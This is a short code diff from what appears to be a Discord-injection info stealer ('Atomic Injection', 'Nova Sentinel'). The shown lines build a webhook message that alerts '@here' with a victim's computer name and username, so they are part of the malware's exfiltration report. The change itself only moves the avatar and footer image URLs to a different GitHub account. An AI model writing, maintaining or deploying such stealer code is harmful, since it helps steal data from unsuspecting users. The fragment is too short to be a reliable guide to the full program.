@@ -7883,7 +7883,7 @@ const { config } = require("process");
               var payload = JSON.stringify({
                 username: "Atomic Injection",
                 avatar_url:
-                  "https://raw.githubusercontent.com/KSCH-58/sub/main/assets/lilnova.png",
+                  "https://raw.githubusercontent.com/KSCHcuck/sub/main/assets/lilnova.png",
                   content: "@here" + "\n`" + computerName + "`" + " - " + "`" + username + "`",
                 embeds: [
                   {
@@ -7892,7 +7892,7 @@ const { config } = require("process");
                     footer: {
                       text: "@Nova Sentinel | https://t.me/Sordeal",
                       icon_url:
-                        "https://raw.githubusercontent.com/KSCH-58/sub/main/assets/gifnova.gif",
+                        "https://raw.githubusercontent.com/KSCHcuck/sub/main/assets/gifnova.gif",
                     },
                     fields: [
                       {
